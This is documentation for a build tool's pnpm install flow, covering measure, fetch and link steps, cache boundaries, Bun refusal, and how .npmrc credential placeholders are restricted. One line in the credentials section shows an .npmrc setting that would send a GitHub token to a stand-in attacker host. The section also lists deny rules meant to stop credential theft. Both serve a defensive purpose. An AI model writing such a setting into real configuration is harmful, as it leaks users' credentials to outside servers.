---
title: "Install"
description: "The install flow: the measure round, the fetch and link split, and why a linked node_modules tree is never restored from another machine."
---

`smithers-build` expresses dependency installation as one flow with one round and
three actions: measure, fetch, and link. Only pnpm installs. A Bun manager is
refused when it is configured, with a typed `unsupported` error, rather than
accepted and failed when the manager is first called.

`node_modules` is a target. A PACKAGE.ts file declares the toolchain once and
asks the `Install` target for the tree:

```ts
import { Smithers } from "@smthrs/targets"

export const runtime = Smithers.Runtime.Node({ version: ">=26.4.0" })
export const packageManager = Smithers.PackageManager.Pnpm({ version: "11.21.0", runtime })
export const nodeModules = Smithers.Install({ packageManager })
```

The CLI also runs the flow directly:

```sh
smithers-build install --workspace /absolute/or/relative/workspace
```

The library layer requires an absolute project root and the declared version.
The platform is not a layer option: it belongs to the `Runtime` service, which
the package-manager layer takes as a dependency.

```ts
PackageManager.layerPnpm({
  projectRoot: "/workspace",
  requirement: "11.21.0"
}).pipe(
  Layer.provideMerge(Runtime.layerNode({
    requirement: ">=26.4.0",
    platform: { os: "linux", arch: "x64", libc: "glibc" }
  }))
)
```

The complete embedding also supplies `Install.layer` from `@smthrs/build`, an
interpreter registration for `Install.Install`, a flow runtime, and Node
filesystem, process, and crypto services. The CLI's own composition, in
[`@smthrs/build-cli`](https://github.com/smithersai/smithers/tree/main/packages/smithers/build/build-cli), is the reference.

## One round

The flow payload is `{ manager }`, the manager the workspace declared.

```text
Measure.call({ manager })
  -> Fetch[manager].call({ content })
    -> Link.call({ content, store })
```

`maxRounds` is one.

The flow used to trampoline. The package-manager implementation is a runtime
layer, so a pure body could not branch on it, and the first round existed to
measure which manager was wired before a second round could select a
manager-specific fetch. The manager is now a plan-time declaration from
PACKAGE.ts, so one body selects one fetch action with one exact lockfile
declaration, and measure feeds it as an ordinary settled upstream reference.

## Measure

`Measure` digests the manager lockfile and the project `.npmrc` when present.
For pnpm it also digests `pnpm-workspace.yaml` and the hook file pnpm loads
(`.pnpmfile.mjs`, else `.pnpmfile.cjs`) when present.

```ts
Content = {
  lockfile: { path, digest }
  npmrc: { path, digest } | null
  pnpmfile: { path, digest } | null
  workspace: { path, digest } | null
}
```

It used to report an `Environment` struct carrying the manager name, the
measured manager version, and the host platform as well. Those three were never
content: they are the identity of two host services, and they now come from
those services.

- Which manager, and which version it must be, is the `PackageManager` service.
  The workspace declares the version and `PackageManager.Service.verify` holds
  the host to it.
- The platform is the `Runtime` service. It describes the machine, so it is not
  a field passed between steps.

The action uses an `expected` boundary and is never answered from the cross-run
engine cache: a restored measurement would describe another machine's checkout.

The declared manager is in the measure payload as key material and is read by
nothing: the implementation takes the manager from its layer. With an empty
payload, a pnpm install and a Bun install of one workspace shared a single
measure key, which the `expected` boundary made inert and a `hard` boundary
would make a hit on another manager's measurement.

`.npmrc` is limited to 256 KiB, `package.json` to 4 MiB, and lockfiles to
64 MiB. The pnpm hook and workspace files use the same 64 MiB bound. Reads use
stable regular-file descriptors, exact UTF-8, and canonical-path checks inside
the project root.

## Fetch identity

The fetch payload includes:

1. the lockfile path and SHA-256 digest;
2. the project `.npmrc` digest or `null`;
3. the pnpm hook and workspace manifest paths and digests, or `null`.

The scheduler also folds declaration identity, layers, capabilities, effects,
and settled dependencies into its step key. The manager name and version reach
the key through the layer identity the planner records for the target, which is
derived from the PACKAGE.ts declaration. The absolute project root and store path
are host placement, not content identity.

Before fetch starts, the implementation checks the layer for internal
consistency, its lockfile name and store directory against what its own manager
name implies, and then holds the host to both declared versions. A mismatch
fails with `environment_mismatch` before anything is written. This replaces the
old cross-round recheck, which could only compare one measurement of a host
against an earlier measurement of the same host.

Fetch and link re-read every measured input before invoking the manager and
again after execution, before returning a manifest. Changed paths, digests,
file presence, or newly unreadable inputs fail with `input_drift`. Preflight
failure prevents the manager operation; postflight failure withholds the
manifest but cannot undo store or tree writes already made. Store identity
includes the reverified hook and workspace digests. Link also checks that the
root `package.json` digest stayed unchanged through execution.

The manager the workspace declared is not compared against the manager the
composition provided. A sealed action receives the layer and never the
declaration, so that comparison belongs to the composition root that wires one
against the other; `d191c9dfcf` removed the guard that pretended otherwise. The
declared manager still reaches the measure step's key material through its
payload, so two managers cannot share one measurement.

Fetch returns a `StoreManifest`:

```ts
{
  manager, managerVersion, platform, digest
}
```

Its digest is SHA-256 over a versioned canonical tuple of the verified manager,
platform, and input digests. It describes what populated the store; it is not
the store bytes.
The tuple uses v2 when either pnpm configuration file is present. With both
absent it preserves the v1 digest.

## Why fetch is not cache-admissible

Fetch declares `.flows/store/<manager>` as a `TreeArtifact`, but its boundary
mode is `expected`, not `hard`. The current manager process runs against an
absolute workspace root and opens its inputs itself. The parent compares
measured files before and after execution but cannot freeze their paths across
the child's opens or detect a change reverted between checks. The unsandboxed
observer also cannot attest that no undeclared path was read or written.

Consequently no fetch result or store tree is replayed from a cross-run engine
cache today. A sandbox lane that supplies hermetic-read and whole-tree evidence
is required before changing this policy.

## Link

Link verifies the measured environment and `StoreManifest`, digests the root
`package.json`, runs the manager's link operation, digests the manager's own
tree evidence, and returns:

```ts
LinkManifest = { store: Digest, manifest: Digest, linked: true }
```

Every new run reconciles `node_modules`; an already completed durable link
attempt replays within its run. A hidden lockfile or modules manifest
describes the graph a manager intended to create, but cannot prove that every
package file is still present and unmodified. There is no
`node_modules/.flows-link.json` freshness shortcut.

The action uses the `irreversible` tier and an `expected` boundary. Its write
declaration names root and nested `node_modules` trees for scheduling, without
publishing them as artifacts. Ignored dependency trees are not captured by ordinary
workspace snapshots, so the runtime cannot promise to undo a partial link.
There is no automatic retry or blind recovery of an uncertain attempt: inspect
and reconcile the tree before starting a new run. Successful attempt replay
does not itself verify or rebuild files changed after that attempt completed.
`node_modules` is a host-local graph of links into the store and is never
restored from another machine.

## Manager support

`PackageManager.Name` is pnpm or Bun, so npm and Yarn cannot be written down
as an install manager at all, and a PACKAGE.ts naming one fails to decode.

| Manager | Status      | Behavior                                                                             |
| ------- | ----------- | ------------------------------------------------------------------------------------ |
| pnpm    | Implemented | Frozen fetch into `.flows/store/pnpm`, then frozen offline link with scripts ignored |
| Bun     | Unsupported | No documented fetch-only and offline-link pair satisfying the contract               |

Bun has no fetch-only or offline install command, so it cannot meet the
fetch-then-link contract. Every install entry point refuses it at configuration
time with `PackageManager.bunInstallUnsupportedMessage`:

| Entry point                           | Refusal                                                        |
| ------------------------------------- | -------------------------------------------------------------- |
| `S.Install({ packageManager: bun })`  | The constructor throws `unsupported: ...`.                     |
| `S.Install` with a Bun `WORKSPACE.ts` | The planner refuses the node before anything spawns.           |
| `runInstall` with a Bun toolchain     | `PackageManagerError { code: "unsupported" }` before any read. |
| The install Flow payload              | `manager` admits only `"pnpm"`; there is no Bun fetch action.  |
| `smthrs init` on a `bun@` manifest    | Refuses before writing `WORKSPACE.ts`.                         |

Bun remains a valid runtime and tool runner: a hand-written `WORKSPACE.ts` may
declare `PackageManager.BunPackages`, and targets run their tools through it,
but `node_modules` must then be installed with Bun outside Smithers.

The pnpm commands are:

```text
pnpm fetch --frozen-lockfile --ignore-scripts --reporter=append-only \
  <hooks> --store-dir <store>

pnpm install --offline --frozen-lockfile --ignore-scripts \
  --reporter=append-only <hooks> --store-dir <store>
```

`<hooks>` is `--pnpmfile <projectRoot>/<hook file> --global-pnpmfile=`, where
the hook file is `.pnpmfile.mjs`, else `.pnpmfile.cjs`, and `--ignore-pnpmfile`
when neither exists. See
[Lifecycle scripts](#lifecycle-scripts).

`<store>` is `<projectRoot>/.flows/store/pnpm` unless the composition passed
`storeDirectory`.

`layerBun` and `layerNoop("bun", options, platform)` still provide the service
shape for targets that run tools under Bun and never install. Version, fetch,
link, and manifest operations fail with `PackageManagerError { code:
"unsupported" }`.

## Environment and credentials

Package-manager children use `extendEnv: false`. They receive deterministic
locale/color settings, selected bootstrap and network variables, and variables
referenced as `${NAME}` in live values of the project `.npmrc`.
The file is read the way pnpm's `ini` decoder reads it: lines split on `\r` as
well as `\n`, lines beginning with `;` or `#` are comments, and a quoted value
is decoded with `JSON.parse`, so `"\u0024{NAME}"` counts as `${NAME}`.
A placeholder in a setting name is refused.
`PATH` keeps only absolute entries, because the child's working directory is
the project root.

A placeholder is allowed only as the whole value of a registry-scoped
credential setting: `//host/path/:_authToken`, `:_auth`, `:_password`, or
`:username`. pnpm sends that value to the host the setting names, and the
repository writes that host. A placeholder anywhere else, such as in
`registry`, a scoped registry, a proxy, or an unscoped `_authToken`, is refused
with `unsafe_configuration`, because the repository would choose the server
that receives the host variable.

The setting's host must also be on the operator's `credentialHosts` list
(`PackageManager.Options.credentialHosts`, default `["registry.npmjs.org"]`).
Otherwise the setting is refused with `unsafe_configuration` before any child
starts, so `//attacker.example/:_authToken=${GITHUB_TOKEN}` never reaches pnpm.
Entries are `host` or `host:port` and match the setting's authority exactly,
ignoring case. The build CLI reads the list from the host variable
`SMITHERS_NPM_CREDENTIAL_HOSTS`, a comma-separated list such as
`registry.npmjs.org,npm.pkg.github.com`, and never from the checkout.

While a credential is forwarded, the repository cannot choose how it travels.
`.npmrc` settings `proxy`, `https-proxy`, `http-proxy`, `noproxy`,
`strict-ssl`, `ca`, `cafile`, `cert`, and `local-address`, and any `registry`
or `@scope:registry` that is not `https://`, are refused with
`unsafe_configuration`. pnpm 10 also reads `httpsProxy`, `httpProxy`, and
`strictSsl` from `pnpm-workspace.yaml`, where they outrank the environment, so
`pnpm fetch` and `pnpm install` get `--config.proxy=`,
`--config.https-proxy=<HTTPS_PROXY>`, `--config.http-proxy=<HTTP_PROXY>`,
`--config.noproxy=<NO_PROXY>`, `--config.strict-ssl=true`, and `--config.ca=`.
The proxy values come from the host environment (lowercase names too) or are
empty, and they appear in the child's argument list.

Two gaps remain, and both need an attacker on the network path, not a server
the repository names. A `pnpm-workspace.yaml` registry or a lockfile tarball URL
may use `http://` for an allowed host, which sends the credential in cleartext.
A `pnpm-workspace.yaml` `cafile` is not pinned.

Only pnpm 10 and earlier expand `${NAME}` in a project `.npmrc`. pnpm 11
ignores project-level placeholders with a warning, so forwarding a variable has
no effect there. The repository's target attributes choose the pnpm version.

Literal auth tokens, passwords, client keys (`key`), one-time passwords (`otp`),
key files, and certificate files in `.npmrc` are refused. Placeholders that
reference process-control names such as
`NODE_*`, `NPM_CONFIG_*`, `PNPM_*`, `BUN_*`, loader variables, or shell startup
variables are also refused. User and global npm configuration paths are forced
to the null device.

Remote-cache endpoint and token variables are removed before the install layer
receives its environment snapshot.

## Store placement

Manager stores are fixed below `.flows/store/<manager>`. Discovery and glob
expansion always exclude that tree.

That placement costs reuse. pnpm's performance model is one machine-wide store
that every project hardlinks from, so a second checkout of a workspace costs a
link pass and no network. A store inside the workspace is owned by that
workspace alone: every clone and every worktree downloads and unpacks the
complete dependency set again and keeps its own copy, and a warm store
elsewhere on the machine is not reused. Size a CI install cache for one full
workspace store per checkout.

`PackageManager.Options.storeDirectory` buys the shared store back for a
composition that drives the manager directly. It is an absolute host path
outside the project root, used for both fetch and the offline link, and
`makeNoop` reports it too. It is rejected when it is relative, unusable, or
inside the project root. The install Flow does not accept it: `executeFetch`
checks the layer's store against `.flows/store/<manager>` and fails with
`environment_mismatch` first, because the fetch write declaration names the
workspace-relative tree and a file set has no host-path entry to name instead.

Because the install action declaration contains that fixed path, the direct
`install` command rejects a custom `cacheDirectory`. Other target verbs may use
one. Making install placement configurable requires changing the declared
boundary and host-state substitution together; silently writing one path while
declaring another is not allowed.

## Lifecycle scripts

Every supported command passes `--ignore-scripts`. Arbitrary package lifecycle
code needs a separate non-sealed execution model and is not part of this flow.

`--ignore-scripts` does not disable pnpm hooks. A project `.pnpmfile.mjs` or
`.pnpmfile.cjs` is repository JavaScript that pnpm executes during fetch and
link, with the manager's selected environment, under the install flow's
declared `proc:spawn` capability. Only the file pnpm loads by default is
loaded: `.pnpmfile.mjs`, else `.pnpmfile.cjs`. Every command names it with
`--pnpmfile` and clears the global hook with `--global-pnpmfile=`, or passes
`--ignore-pnpmfile` when neither exists, so a `pnpmfile` or `globalPnpmfile`
setting in `pnpm-workspace.yaml` is never loaded. Measure hashes the hook file
and `pnpm-workspace.yaml`, and FetchPnpm and Link declare their reads. Link
also declares workspace member `package.json` reads. Hook imports and other dynamic reads are not a hermetic
input closure; the expected boundary keeps these actions out of the shared
cache. Measure hashes only the hook file's own bytes. A hook that runs
`require("./impl.cjs")` executes `impl.cjs` undigested, and a change to
`impl.cjs` does not move the store manifest. Keep the hook self-contained, or
change the hook file whenever what it imports changes.

## Next

- [Actions and boundaries](actions-and-boundaries.md)
- [Install](../reference/targets/install.md)
- [PnpmWorkspace](../reference/targets/pnpm-workspace.md)
- [Remote caching](../workspace/remote-caching.md)
